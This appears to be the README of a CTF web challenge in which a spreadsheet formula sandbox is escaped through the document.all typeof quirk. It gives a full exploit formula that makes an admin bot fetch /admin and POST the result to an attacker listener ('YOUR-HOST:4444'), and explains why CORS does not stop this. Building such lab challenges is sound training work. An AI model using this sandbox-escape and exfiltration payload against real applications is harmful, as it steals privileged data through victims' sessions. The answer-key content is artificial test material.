# OpenInsight

Prediction-market analysis spreadsheet platform. CTF web challenge built
around the `document.all` willful-violation spec quirk.

## Services

- `web` (port **3000**) — the Next.js spreadsheet app. Signup/login,
  publish and view workbooks, client-side formula engine.
- `bot` (port **3001**) — a separate site hosting an admin review queue.
  Submit a sheet id and an admin (Puppeteer, logged in as `admin_alice`)
  will open and export it.

## Run

```sh
docker compose up --build
```

Then:

- `http://localhost:3000` — the main app.
- `http://localhost:3001` — the admin review queue.

## The flag

Lives at `/admin`, only visible when signed in with role `admin`.
Controlled by the `FLAG` env var on the web service.

## Intended solve

1. Click the **Admin ▸** link in the nav. `/admin` 404s unless you're
   signed in as an admin — so the flag lives there, and you need to
   reach it through an admin's browser, not yours.
2. The bot at `http://localhost:3001/` says it logs in as an admin and
   opens whatever sheet you submit. That's your foothold — get code
   running in the bot's page.
3. Notice the popular **"OpenInsight share card"** sheet: formulas like
   `=document.title` and `=document.URL` tell you the formula sandbox
   exposes `document`.
4. Read `lib/formula-engine.ts` (shipped in the build). The `document`
   proxy hides anything whose typeof is `"object"` or `"function"` —
   that blocks `document.body`, `document.getElementById`, and friends.
5. `document.all` has `typeof === "undefined"` by spec (HTML's
   `[[IsHTMLDDA]]` willful violation) while still being a real
   `HTMLAllCollection`. It slips through the filter, and the proxy only
   wraps `document` itself — values returned from it are raw. From any
   element you can reach `element.ownerDocument.defaultView`, which is
   the real `window`, which gives you `XMLHttpRequest` and `fetch`.
6. The nav bar renders `<span id="current-user">`, a reliable pivot
   point. Plant this formula in a cell:
   ```
   =(()=>{const w=document.all['current-user'].ownerDocument.defaultView;
   const x=new w.XMLHttpRequest();x.open('GET','/admin',false);x.send();
   w.fetch('http://YOUR-HOST:4444/',{method:'POST',body:x.responseText});
   return ''})()
   ```
7. Submit your sheet id at `http://localhost:3001/`. The bot visits
   logged in as the admin, the payload synchronously fetches `/admin`
   with the admin's cookies, and `fetch`es the response to your
   listener. Flag is in the body.

CORS doesn't block the exfil — cross-origin `POST` with the default
content-type is a "simple" request that goes out without preflight; the
browser refusing to let JS read the *response* doesn't matter because
the attacker's server receives the body fine.

## Notable files

- `lib/formula-engine.ts` — the sandbox. The proxy wraps only
  `document` itself, not values returned from it.
- `components/Nav.tsx` — the `#current-user` pivot into the DOM.
- `bot/index.js` — Puppeteer worker + two-step chunked response queue.

## Reference solver

`solve/solve.js` drives the full solve end-to-end using Puppeteer. Run it
against a live instance:

```sh
cd solve && npm install
WEB_URL=http://localhost:3000 BOT_URL=http://localhost:3001 \
  LISTEN_HOST=<your host IP the bot container can reach> \
  npm run solve
```

`LISTEN_HOST` must be an address the bot's browser (inside the
challenge's Docker network) can connect back to — your host's LAN IP
when running compose on the same machine as the solver.

The script prints progress to stderr and the flag to stdout on success.

## Development

```sh
pnpm install
pnpm seed
pnpm dev          # web on :3000
cd bot && node index.js  # bot on :3001 (needs WEB_URL env)
```

Reset state by deleting `data/openinsight.db`.
